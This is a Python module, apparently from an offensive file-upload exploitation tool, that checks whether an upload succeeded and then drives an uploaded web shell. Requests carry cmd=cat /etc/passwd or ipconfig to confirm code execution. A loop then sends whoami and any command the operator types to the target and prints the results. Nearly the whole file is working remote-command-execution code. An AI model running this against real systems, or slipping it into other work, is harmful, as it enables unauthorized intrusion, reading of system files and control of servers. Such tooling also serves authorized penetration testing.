#!/usr/bin/env python3

# This script contains functions for sending requests, interactive shell, and response checking.

# Import necessary modules
import urllib
from urllib.parse import urljoin
from .results_output import *
from . import alerts
from . import file_upload
import base64


# Function for interactive shell
def interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension,
                      current_time, response, user_options, skip_module):
    file_name = file_name.encode("latin-1")

    if not isinstance(is_magic_bytes, bool):
        is_magic_bytes = base64.b64encode(is_magic_bytes).decode('latin-1')

    if options.upload_dir != 'optional' and options.exploitation and not skip_module:
        parameter_exists = False
        if options.upload_dir.endswith("=/"):
            options.upload_dir = options.upload_dir[:-1]
            parameter_exists = True

        if "?" in options.upload_dir:
            parameter_exists = True

        results(options.url, file_name, content_type, upload_dir, is_magic_bytes, options.output_dir, allowed_extension,
        current_time)

        filename = file_name.decode("ascii")
        partial_url = urljoin(options.url, options.upload_dir)

        if parameter_exists:
            final_url = f"{partial_url}{filename}&cmd=cat /etc/passwd"
        else:
            final_url = f"{partial_url}{filename}?cmd=cat /etc/passwd" 

        response, final_url = file_upload.send_get_request(headers, options, final_url)
        # Display # if the shell is accessed with the root user
        if 'root' in response.text:
            alerts.warning("Interactive shell is activated, you can enter system commands: ")
        
        # Display $ if the shell isn't accessed with the root user
        if 'root' not in response.text:
            if parameter_exists:
                final_url = f"{partial_url}{filename}&cmd=ipconfig"
            else:
                final_url = f"{partial_url}{filename}?cmd=ipconfig"

            response, final_url = file_upload.send_get_request(headers, options, final_url)
            if 'Default Gateway' in response.text:
                alerts.warning("Interactive shell is activated, you can enter system commands: ")
            else:
                return
        
        if not options.bruteForce:
            file_upload.printing(options, user_options, response, file_name.decode('latin-1'), 100, current_time,
                                 options.current_module, is_magic_bytes, options.current_mimetype)
            
        # Loop to run user commands on the target machine
        while True:
            try:
                if options.bruteForce:
                    alerts.warning("To exit interactive shell type exit, to continue the scan CTRL + C")
                else:
                    alerts.warning("To exit interactive shell type exit or press CTRL + C")
                filename = file_name.decode("ascii")
                partial_url = urljoin(options.url, options.upload_dir)
                if parameter_exists:
                    final_url = f"{partial_url}{filename}&cmd=whoami"
                else:
                    final_url = f"{partial_url}{filename}?cmd=whoami" 
                
                response, final_url = file_upload.send_get_request(headers, options, final_url)
                
                # Display # if the shell is accessed with the root user
                if 'root' in response.text:
                    command = input(f"\n{green}└─# {reset}")  # User input command to execute on the target machine
                # Display $ if the shell isn't accessed with the root user
                else:
                    command = input(f"\n{green}└─$ {reset}")  # User input command to execute on the target machine

                filename = file_name.decode("ascii")
                cmd_encoded = urllib.parse.quote(command)  # Encode the user command
                partial_url = urljoin(options.url, options.upload_dir)
                if parameter_exists:
                    final_url = f"{partial_url}{filename}&cmd={cmd_encoded}"
                else:
                    final_url = f"{partial_url}{filename}?cmd={cmd_encoded}"

                # Split the URL to capture the user's command
                user_command = final_url.split("=")
                user_command = user_command[-1]

                if 'exit' in user_command.lower():
                    exit(1)

                response, final_url = file_upload.send_get_request(headers, options, final_url)

                # Remove the hexadecimal values that typically represents the start of a PNG file
                response_text = response.text

                print("")
                print(response_text.rstrip())

                if 'clear' in user_command.lower():
                    print("\033c", end="")
                else:

                    # Display the command executed and the response received
                    alerts.info(f"URL: {final_url}")

            except KeyboardInterrupt:

                if not options.bruteForce:
                    # Handle keyboard interrupt exception if the user stops the script execution
                    print("")
                    alerts.error("Keyboard interrupt exception is caught!")
                else:
                    break

    else:
        
        if options.upload_dir != 'optional' and not skip_module:
            parameter_exists = False
            
            if options.upload_dir.endswith("=/"):
                options.upload_dir = options.upload_dir[:-1]
                parameter_exists = True  

            filename = file_name.decode("ascii")
            partial_url = urljoin(options.url, options.upload_dir)
            final_url = f"{partial_url}{filename}"

            response, final_url = file_upload.send_get_request(headers, options, final_url)
            file_data = open(f"assets/samples/sample.{options.file_extension}", 'r', encoding="latin-1")
            file_data = file_data.read()

            if "Is this message being rendered?" in response.text and file_data not in response.text:
                pass
            else:
                return        

        if isinstance(file_name, bytes):
            file_name = file_name.decode('latin-1')

        if not options.bruteForce:
            file_upload.printing(options, user_options, response, file_name, 100, current_time, options.current_module,
                                 is_magic_bytes, options.current_mimetype)
            # Display upload successful message and location to access the file
            alerts.success(f"File uploaded successfully with: {file_name}")
            if not skip_module:
                results(options.url, file_name, content_type, upload_dir, is_magic_bytes, options.output_dir, allowed_extension,
                        current_time)
                exit(1)
        else:
            results(options.url, file_name, content_type, upload_dir, is_magic_bytes, options.output_dir, allowed_extension,
                    current_time)            
            alerts.success(f"File uploaded successfully with: {file_name}")


# Function for response checking
def response_check(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension, current_time,
                   response, user_options, skip_module):
    text_or_code = options.text_or_code
    response_status = ""
    if str(text_or_code).isdigit():

        # Check if response is match the status code in message
        if options.text_or_code == response.status_code:  # If status code is equals to the status code of the response
            response_status = "success"
            interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension,
                              current_time, response, user_options, skip_module)

        else:
            response_status = "fail"

    elif text_or_code == 'success_message':

        # Check if success_message in the response
        if options.upload_message in response.text:  # If success text is present in the response body
            response_status = "success"
            interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension,
                              current_time, response, user_options, skip_module)

        else:
            response_status = "fail"

    elif text_or_code == 'failure_message':

        # Check if failure message not in response
        if options.upload_message not in response.text:  # If success text is present in the response body
            response_status = "success"
            interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension,
                              current_time, response, user_options, skip_module)
        else:
            response_status = "fail"

    return response_status
